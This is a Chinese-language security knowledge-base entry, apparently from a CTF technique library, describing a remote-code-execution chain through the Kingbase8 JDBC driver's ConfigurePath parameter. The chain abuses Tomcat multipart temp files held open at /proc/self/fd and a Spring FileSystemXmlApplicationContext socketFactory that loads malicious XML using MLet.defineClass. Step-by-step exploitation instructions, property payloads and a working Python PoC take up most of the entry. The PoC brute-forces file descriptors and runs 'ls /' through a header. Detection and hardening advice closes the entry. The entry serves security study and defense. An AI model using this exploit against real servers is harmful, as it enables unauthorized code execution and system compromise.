---
id: web-java-component-kingbase8-jdbc-configurepath-tempfile-spring-xml-rce
title: Kingbase8 JDBC ConfigurePath 本地属性文件注入：socketFactory 通配符加载临时文件 Spring XML RCE
type: scenario
domain: web
path: web/java/component
technique: kingbase8-jdbc-configurepath-tempfile-spring-xml-rce
aliases:
- Kingbase8 ConfigurePath
- JDBC 属性文件注入
- socketFactoryArg 通配符
- Tomcat 临时文件 fd 爆破
- FileSystemXmlApplicationContext 本地 XML
- MLet defineClass
tags:
- java
- jdbc
- kingbase8
- spring
- socketfactory
- tempfile
- proc-self-fd
- xml-bean
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V123
  verified_at: '2026-11-06T04:22:53+08:00'
  notes: 已对照原文与23张图核对：Pg 默认 driver=org.postgresql.Driver 被 Jackson setter 覆盖、validateJdbcUrl 去 // 绕过、Kingbase8 ConfigurePath→initJDBCCONF→loadPropertyFiles→FileInputStream 加载、multipart 临时文件 /proc/self/fd 爆破、socketFactory=FileSystemXmlApplicationContext 与 file:/${catalina.home}/**/*.tmp、最终 X-Authorization 回显 ls / 均与原文/截图一致。已修正 CVE-2022-21724 影响区间为 42.3.x<42.3.3 与 42.2.x<42.2.25（原文环境 42.3.6 已修复）。原文未给 Kingbase8/Spring 版本，未设置 versions；frontmatter 无 sources/source_url。未验证点：本库未复跑该链。
---

## 一句话结论

Kingbase8 JDBC 驱动的 `ConfigurePath` 会从本地文件加载 Properties；把 `jdbcUrl` 写成 `jdbc:kingbase8:...?ConfigurePath=/proc/self/fd/<N>`，再用并发 multipart 请求让 Tomcat 保持临时文件打开，即可把属性文件（含 `socketFactory=FileSystemXmlApplicationContext`、`socketFactoryArg=file:/.../**/*.tmp`）喂给驱动，最终让 Spring 从另一个临时文件加载恶意 XML，经 `MLet.defineClass` 执行任意类。

## 原理

- **可控 JDBC 入口**：`/api/connection` 接收 JSON，`ObjectMapper.readValue(configurationJson, Pg.class)` 反序列化；`Pg` 默认 `driver=org.postgresql.Driver`，JSON 中的 `driver` 字段会覆盖默认值（Jackson setter 赋值），因此可切到 `com.kingbase8.Driver`。
- **URL 过滤绕过**：`validateJdbcUrl` 拦截 `:/`、`/?` 与 `socketFactory`/`socketFactoryArg` 等黑名单；但 `jdbc:kingbase8:127.0.0.1:54321/test?a=1` 不含 `:/`，且 `ConfigurePath` 不在黑名单，可直接使用。
- **ConfigurePath 本地文件加载**：Kingbase8 `Driver.connect` 发现 `KBProperty.CONFIGUREPATH` 非空时调用 `initJDBCCONF` → `loadPropertyFiles` → `new FileInputStream(f); p.load(...)`。即 URL 参数可指定任意本地文件作为属性文件，属性值可覆盖 `socketFactory`/`socketFactoryArg`。
- **无上传写文件**：向同一接口发一个 multipart 请求并保持连接不结束，Tomcat 会把请求体写入临时文件并保持 fd；`/proc/self/fd/<N>` 可被 `FileInputStream` 打开。爆破 N（1..1000）即可命中该临时文件。临时文件内容中嵌入两行属性：
  ```properties
  socketFactory=org.springframework.context.support.FileSystemXmlApplicationContext
  socketFactoryArg=file:/${catalina.home}/**/*.tmp
  ```
  这两行可以包在一个合法 Spring XML 的字符串 bean 里：`Properties.load` 仍会按行读到它们，而同一文件被 Spring 通配符匹配时也能作为 XML 解析。
- **Spring XML 加载**：`socketFactoryArg` 使用 `file:/${catalina.home}/**/*.tmp` 通配符，`FileSystemXmlApplicationContext` 会匹配目录下所有 `.tmp`；另一个并发 multipart 请求保持的临时文件放真正的恶意 Spring XML（`MethodInvokingFactoryBean` + `MLet.defineClass`），被通配符匹配并解析，加载攻击者提供的类字节码，`newInstance` 后执行。
- **为什么可行**：JDBC 驱动允许 `socketFactory` 实例化任意类；Kingbase8 的 `ConfigurePath` 把“本地属性文件”变成可控注入点；Spring `FileSystemXmlApplicationContext` 支持通配符资源；Tomcat multipart 临时文件在请求未结束时持续存在，`/proc/self/fd` 提供稳定路径。
- 该链需要：可控 JDBC URL/driver、Kingbase8 驱动在 classpath、Spring Context 在 classpath、能并发保持 multipart 请求、`/proc` 可读。

## 触发条件

- 应用提供 JDBC 连接测试/数据源配置接口，用户可控 `jdbcUrl` 与 `driver`，且服务端实际 `Driver.connect`。
- classpath 含 Kingbase8 JDBC 驱动（或同源未修复的 pgjdbc `socketFactory` 逻辑）与 Spring Context。
- URL 过滤未覆盖 `ConfigurePath`，或可通过去 `//`/默认主机端口绕过连接格式校验。
- 能发送并发 multipart 请求并保持连接；Tomcat 临时目录可写、`/proc/self/fd` 可访问。
- 目标未禁用 `FileSystemXmlApplicationContext`/`MLet`，或未启用严格 SecurityManager。

## 利用步骤

1. 通过路由大小写/Unicode 绕过等进入 `/api/connection`，确认 JSON 可覆盖 `driver` 为 `com.kingbase8.Driver`。
2. 准备两个文件：
   - 属性载体：包含 `socketFactory=org.springframework.context.support.FileSystemXmlApplicationContext` 与 `socketFactoryArg=file:/${catalina.home}/**/*.tmp` 两行（可包在合法 XML 字符串 bean 中）；
   - 恶意 Spring XML：用 `MethodInvokingFactoryBean` 解码 Base64 类字节码，`MLet.defineClass` 加载并 `newInstance`。
3. 开两个线程/连接，分别向 `/api/connection` 发 multipart 请求上传上述文件，并保持连接不关闭（临时文件因此不被删除）。
4. 另起请求，JSON 设 `driver=com.kingbase8.Driver`、`jdbcUrl=jdbc:kingbase8:127.0.0.1:54321/test?ConfigurePath=/proc/self/fd/<N>`，并发爆破 N=1..1000。
5. 命中后驱动加载属性文件，`socketFactory` 实例化 `FileSystemXmlApplicationContext`，通配符匹配恶意 XML，bean 初始化执行类加载/命令。
6. 通过响应、`X-Authorization` 头或回显文件确认命令执行，读取 flag/下一跳。
7. 若不稳定，重试/换容器；临时文件生命周期与并发时序敏感。

## PoC

```python
import json, socket, threading, time, requests
from concurrent.futures import ThreadPoolExecutor

HOST, PORT = "127.0.0.1", 8080
URL = f"{HOST}:{PORT}"

def hold_multipart(path):
    raw = open(path, "rb").read()
    body = (b"POST /api/connection HTTP/1.1\r\nHost: " + URL.encode() +
            b"\r\nContent-Type: multipart/form-data; boundary=xxxxxx\r\n"
            b"Content-Length: 1296800\r\n\r\n--xxxxxx\r\n"
            b'Content-Disposition: form-data; name="file"; filename="a.txt"\r\n\r\n' +
            raw + b"\n" * (1024 * 124))
    s = socket.socket(); s.connect((HOST, PORT)); s.sendall(body)
    time.sleep(1111111)          # 保持连接，临时文件不删除

threading.Thread(target=hold_multipart, args=("./evil.txt",), daemon=True).start()
threading.Thread(target=hold_multipart, args=("./exp.xml",), daemon=True).start()
time.sleep(1)

def try_fd(fd):
    payload = {
        "urlType": "jdbcUrl",
        "driver": "com.kingbase8.Driver",
        "jdbcUrl": f"jdbc:kingbase8:127.0.0.1:54321/test?ConfigurePath=/proc/self/fd/{fd}",
        "username": "postgres",
        "password": "x",
    }
    r = requests.post(f"http://{HOST}:{PORT}/api/connection/%C5%BFuctf",
                      json=payload, timeout=5,
                      headers={"X-Authorization": "ls /"})
    return fd, r.status_code, r.text[:200]

with ThreadPoolExecutor(max_workers=10) as ex:
    for res in ex.map(try_fd, range(1, 1000)):
        print(res)
```

说明：PoC 为原文脚本的结构化精简，未在本机执行；原文通过 `ConfigurePath=/proc/self/fd/26` 命中属性临时文件，并用 `X-Authorization: ls /` 回显根目录。

## 变体与关联

- 变体（驱动）：PostgreSQL pgjdbc 42.3.x < 42.3.3 与 42.2.x < 42.2.25 的 `socketFactory`（CVE-2022-21724；原文环境 42.3.6 已修复）、MySQL `NamedPipeSocketFactory`、H2 `INIT=RUNSCRIPT`、Oracle `LDAP` 等；属性名/类限制不同。
- 变体（本地文件来源）：上传目录、日志文件、临时文件、`/proc/self/fd`、`/proc/self/environ`；有上传点时可直接写 XML。
- 变体（XML 执行）：`ProcessBuilder` + `init-method`、`MethodInvokingFactoryBean`、SpEL、`MLet.defineClass`、`ClassPathXmlApplicationContext`。
- 关联：[[web-java-component-jdbc-duplicate-param-socketfactory-property-smuggling]]（socketFactory 属性走私）；[[web-java-deserialization-mysql-jdbc-namedpipe-proc-fd-no-egress]]（/proc/self/fd 临时文件）；[[web-java-component-tomcat-multipart-tempfile-fd]]（Tomcat multipart 临时文件 fd）；[[web-java-component-weaver-ecology-jdbc-socketfactory-memshell]]（JDBC socketFactory 加载 XML 内存马）。
- 边界：驱动升级并限制 socketFactory 类、`ConfigurePath` 被过滤、临时文件不可读/被清理、Spring Context 不在 classpath、或 SecurityManager 禁止文件/反射时，本链不成立。

## 检测与防御

- 检测：JDBC URL 中出现 `ConfigurePath`、`socketFactory`、`socketFactoryArg`、`file:`、`/proc/self/fd`；JSON 中 `driver` 被改为非默认驱动；同一接口出现长时间保持的 multipart 请求与大量 `/proc/self/fd` 探测。
- 防御：数据源测试接口仅管理员可用；`driver` 使用服务端白名单，不接受用户指定；JDBC URL 只允许固定主机/端口/库名，拒绝任意属性键。
- 加固：升级 JDBC 驱动并限制 `socketFactory` 实现类；禁用 `FileSystemXmlApplicationContext`/`MLet`/`MethodInvokingFactoryBean` 等危险 bean；以低权限用户运行，限制 `/proc` 与临时目录访问；启用 SecurityManager/容器沙箱。
- 加固：临时文件及时清理、上传请求限制大小/并发；监控异常 XML 解析与类加载。
